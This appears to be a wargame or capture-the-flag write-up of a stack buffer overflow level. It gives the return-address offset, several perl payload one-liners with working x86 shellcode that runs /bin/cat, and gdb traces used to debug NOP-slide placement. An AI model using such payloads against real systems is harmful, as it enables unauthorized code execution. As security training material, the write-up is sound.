This one is weird so far. Running the binary without any args doesn't seem to do anything.
Let's try and do this basically how we did level 2.

Main will return to 0xf7e2f637. A 4 byte input is written to 0xffffd52c. The return address is stored in the stack
at 0xffffd63c, an offset of 272. If we write 272 bytes, the next 4 should overwrite this return address. We will
attempt to load 41414141 into eip to test this offset:

    perl -e 'print "D" x 272 . "AAAA"'

The offset works. Now, let's prepare an env payload.
We'll store our /bin/cat shellcode in env EVIL with a 256 byte NOP slide

    export EVIL=$(perl -e 'print "\x90" x 256 . "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2f\x68\x61\x78\x68\x2f\x74\x6d\x70\x89\xe2\x50\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')

getenvaddr says EVIL will be at 0xffffd754, so we will ret to 0xffffd7d4

perl -e 'print "A" x 272 . "\xd4\xd7\xff\xff"'

We successfully jumped into EVIL, but it looks like the memory in the environment has all been zeroed.
This must be what the previous part of the code was doing. No biggie, next we'll store our shellcode in the stack and return into it.

We'll be inputting 276 bytes of data. GDB shows our write occurring at 0xffffd2ec. With 40 bytes of shellcode, we can accomodate a NOP slide
of 232 bytes. 116 bytes past the GDB write addr will be our target: 0xffffd360.

perl -e 'print "\x90" x 232 . "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2f\x68\x61\x78\x68\x2f\x74\x6d\x70\x89\xe2\x50\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80" . "\x60\xd3\xff\xff"'

Weird stuff is happening now. We successfully return into the NOP slide. We can see the first part of our shellcode and successfully run this far:

    |0xffffd3c9      nop
    │0xffffd3ca      nop
    │0xffffd3cb      nop
    │0xffffd3cc      nop
    │0xffffd3cd      nop
    │0xffffd3ce      nop
    │0xffffd3cf      nop
    │0xffffd3d0      nop
    │0xffffd3d1      nop
    │0xffffd3d2      nop
    │0xffffd3d3      nop
    │0xffffd3d4      xor    eax,eax
    │0xffffd3d6      push   eax
    │0xffffd3d7      push   0x7461632f
    │0xffffd3dc      push   0x6e69622f
    │0xffffd3e1      mov    ebx,esp
    │0xffffd3e3      push   eax
    │0xffffd3e4      push   0x7861682f
    │0xffffd3e9      push   0x706d742f
    │0xffffd3ee      mov    edx,esp
    │0xffffd3f0      push   eax
    │0xffffd3f1      push   edx
   >│0xffffd3f2      push   ebx

But then we find instructions that aren't part of our shellcode, which trigger a segmentation fault.

    |0xffffd3ef      js     0xffffd3f1
   >│0xffffd3f1      add    BYTE PTR [eax],al
    │0xffffd3f3      add    BYTE PTR [edi],ch
    │0xffffd3f5      bound  ebp,QWORD PTR [ecx+0x6e]
    │0xffffd3f8      das
    │0xffffd3f9      arpl   WORD PTR [ecx+0x74],sp
    │0xffffd3fc      add    BYTE PTR [eax],al
    │0xffffd3fe      add    BYTE PTR [eax],al
    │0xffffd400      add    BYTE PTR [eax],al
    │0xffffd402      add    BYTE PTR [eax],al

Our NOP slide is huge, we've got room to spare. Let's try offsetting our shellcode back 40 bytes. We'll write 192 NOP instructions, our shellcode,
and 40 bytes of filler before the address. The new address will be 20 bytes back, 0xffffd34c

perl -e 'print "\x90" x 192 . "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2f\x68\x61\x78\x68\x2f\x74\x6d\x70\x89\xe2\x50\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80" . "A" x 40 . "\x4c\xd3\xff\xff"'

success